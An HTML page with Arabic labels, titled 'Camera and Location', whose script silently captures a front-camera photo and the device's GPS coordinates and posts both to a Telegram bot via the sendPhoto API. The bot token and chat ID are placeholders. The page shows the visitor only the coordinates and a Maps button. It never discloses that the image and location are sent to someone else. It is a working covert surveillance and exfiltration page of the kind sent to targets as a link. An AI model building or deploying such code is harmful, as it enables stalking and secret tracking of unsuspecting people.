<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>كاميرا وموقع</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
      background-color: #fff;
      font-family: Arial, sans-serif;
      color: #333;
    }
    canvas {
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      margin-bottom: 20px;
    }
    #location {
      font-size: 16px;
      direction: ltr;
      margin-bottom: 10px;
    }
    #mapsBtn {
      padding: 8px 16px;
      font-size: 16px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      display: none;
    }
    #mapsBtn:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="300" height="400"></canvas>
  <div id="location"></div>
  <button id="mapsBtn">افتح الموقع في Google Maps</button>

<script>
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const context = canvas.getContext("2d");
  const locationDiv = document.getElementById("location");
  const mapsBtn = document.getElementById("mapsBtn");

  let latitude = null, longitude = null;

  // تشغيل الكاميرا
  navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" },
    audio: false
  }).then(stream => {
    video.srcObject = stream;
    video.onloadedmetadata = () => {
      setTimeout(() => {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        stream.getTracks().forEach(track => track.stop());

        // بعد التقاط الصورة، نحولها لـ base64 ونرسلها
        const imageData = canvas.toDataURL("image/png");

        // نرسل البيانات فقط إذا كانت الإحداثيات متوفرة
        if (latitude && longitude) {
          sendToTelegram(imageData, latitude, longitude);
        }
      }, 1000);
    };
  });

  // تحديد الموقع
  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        latitude = pos.coords.latitude.toFixed(6);
        longitude = pos.coords.longitude.toFixed(6);
        locationDiv.textContent = `Latitude: ${latitude} | Longitude: ${longitude}`;

        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        mapsBtn.style.display = "inline-block";
        mapsBtn.onclick = () => window.open(mapsLink, "_blank");
      }
    );
  }

  // إرسال البيانات إلى تليجرام
  function sendToTelegram(base64Image, lat, lon) {
    const botToken = "YOUR_BOT_TOKEN";
    const chatId = "YOUR_CHAT_ID";

    // تحويل الصورة إلى Blob لإرسالها
    fetch(base64Image)
      .then(res => res.blob())
      .then(blob => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "image.png");
        formData.append("caption", `📍 الموقع:\nLatitude: ${lat}\nLongitude: ${lon}`);

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: formData
        });
      });
  }
</script>

</body>
</html>
